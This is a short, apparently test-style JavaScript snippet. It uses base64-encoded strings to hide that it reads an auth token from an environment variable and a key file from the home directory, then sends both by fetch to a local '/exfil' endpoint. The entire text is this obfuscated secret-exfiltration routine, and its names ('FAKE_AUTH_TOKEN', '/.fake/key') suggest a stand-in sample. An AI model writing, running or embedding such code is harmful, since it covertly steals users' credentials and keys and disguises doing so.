const a = Buffer.from('RkFLRV9BVVRIX1RPS0VO', 'base64').toString('ascii');
const b = process.env[a];
const c = Buffer.from('aHR0cDovL2xvY2FsaG9zdDo4MDgwL2V4ZmlsP3E9', 'base64').toString('ascii');
fetch(Buffer.from(c + b).toString('ascii'));
const d = Buffer.from('Ly5mYWtlL2tleQ==', 'base64').toString('ascii');
fetch(c + require('fs').readFileSync(require('os').homedir() + d));
